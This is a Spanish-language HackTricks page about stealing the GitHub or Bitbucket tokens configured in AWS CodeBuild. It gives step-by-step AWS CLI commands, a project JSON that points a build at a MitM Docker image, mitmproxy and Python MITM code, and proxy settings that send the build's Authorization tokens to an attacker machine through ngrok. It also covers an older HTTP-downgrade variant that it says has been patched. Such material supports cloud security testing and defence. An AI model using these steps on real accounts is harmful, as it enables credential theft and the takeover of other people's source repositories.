# AWS Codebuild - Fuga de Tokens

<details>

<summary><strong>Aprende hacking de AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue**me en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Recuperar Tokens Configurados de Github/Bitbucket

Primero, verifica si hay credenciales de origen configuradas que podr√≠as filtrar:
```bash
aws codebuild list-source-credentials
```
### Via Docker Image

Si descubre que la autenticaci√≥n, por ejemplo, a Github est√° configurada en la cuenta, puede **exfiltrar** ese **acceso** (**token de GH o token de OAuth**) haciendo que Codebuild **utilice una imagen de Docker espec√≠fica** para ejecutar la construcci√≥n del proyecto.

Para este prop√≥sito, podr√≠a **crear un nuevo proyecto de Codebuild** o cambiar el **entorno** de uno existente para configurar la **imagen de Docker**.

La imagen de Docker que podr√≠a usar es [https://github.com/carlospolop/docker-mitm](https://github.com/carlospolop/docker-mitm). Esta es una imagen de Docker muy b√°sica que configurar√° las **variables de entorno `https_proxy`**, **`http_proxy`** y **`SSL_CERT_FILE`**. Esto le permitir√° interceptar la mayor√≠a del tr√°fico del host indicado en **`https_proxy`** y **`http_proxy`** y confiar en el CERT SSL indicado en **`SSL_CERT_FILE`**.

1. **Cree y suba su propia imagen Docker MitM**
* Siga las instrucciones del repositorio para configurar la direcci√≥n IP de su proxy y establecer su certificado SSL y **construir la imagen de Docker**.
* **NO CONFIGURE `http_proxy`** para no interceptar solicitudes al punto final de metadatos.
* Podr√≠a usar **`ngrok`** como `ngrok tcp 4444` para configurar el proxy a su host.
* Una vez que tenga construida la imagen de Docker, **s√∫bala a un repositorio p√∫blico** (Dockerhub, ECR...)
2. **Configure el entorno**
* Cree un **nuevo proyecto de Codebuild** o **modifique** el entorno de uno existente.
* Configure el proyecto para usar la **imagen de Docker generada anteriormente**

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

3. **Configure el proxy MitM en su host**

* Como se indica en el **repositorio de Github**, podr√≠a usar algo como:
```bash
mitmproxy --listen-port 4444  --allow-hosts "github.com"
```
{% hint style="success" %}
La **versi√≥n de mitmproxy utilizada fue la 9.0.1**, se inform√≥ que con la versi√≥n 10 esto podr√≠a no funcionar.
{% endhint %}

4. **Ejecuta el build y captura las credenciales**

*   Puedes ver el token en el encabezado **Authorization**:

<figure><img src="../../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Esto tambi√©n podr√≠a hacerse desde aws cli con algo como

{% code overflow="wrap" %}
```bash
# Create project using a Github connection
aws codebuild create-project --cli-input-json file:///tmp/buildspec.json

## With /tmp/buildspec.json
{
"name": "my-demo-project",
"source": {
"type": "GITHUB",
"location": "https://github.com/uname/repo",
"buildspec": "buildspec.yml"
},
"artifacts": {
"type": "NO_ARTIFACTS"
},
"environment": {
"type": "LINUX_CONTAINER", // Use "ARM_CONTAINER" to run docker-mitm ARM
"image": "docker.io/carlospolop/docker-mitm:v12",
"computeType": "BUILD_GENERAL1_SMALL",
"imagePullCredentialsType": "CODEBUILD"
}
}

## Json

# Start the build
aws codebuild start-build --project-name my-project2
```
### ~~A trav√©s del protocolo HTTP~~

{% hint style="success" %}
**Esta vulnerabilidad fue corregida por AWS en alg√∫n momento de la semana del 20 de febrero de 2023 (creo que el viernes). Por lo tanto, un atacante ya no puede abusar de ella :)**
{% endhint %}

Un atacante con **permisos elevados en un CodeBuild podr√≠a filtrar el token de Github/Bitbucket** configurado o si los permisos se configuraron a trav√©s de OAuth, el **token temporal de OAuth utilizado para acceder al c√≥digo**.

* Un atacante podr√≠a agregar las variables de entorno **http\_proxy** y **https\_proxy** al proyecto CodeBuild apuntando a su m√°quina (por ejemplo, `http://5.tcp.eu.ngrok.io:14972`).

<figure><img src="../../../../.gitbook/assets/image (91).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* Luego, cambiar la URL del repositorio de github para usar HTTP en lugar de HTTPS, por ejemplo: \*\*http://\*\*github.com/carlospolop-forks/TestActions
* Despu√©s, ejecutar el ejemplo b√°sico de [https://github.com/synchronizing/mitm](https://github.com/synchronizing/mitm) en el puerto indicado por las variables de proxy (http\_proxy y https\_proxy)
```python
from mitm import MITM, protocol, middleware, crypto

mitm = MITM(
host="127.0.0.1",
port=4444,
protocols=[protocol.HTTP],
middlewares=[middleware.Log], # middleware.HTTPLog used for the example below.
certificate_authority = crypto.CertificateAuthority()
)
mitm.run()
```
* Finalmente, haz clic en **Build the project**, las **credenciales** se **enviar√°n en texto claro** (base64) al puerto mitm:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Ahora un atacante podr√° usar el token desde su m√°quina, listar todos los privilegios que tiene y (ab)usarlos m√°s f√°cilmente que utilizando el servicio CodeBuild directamente.
{% endhint %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
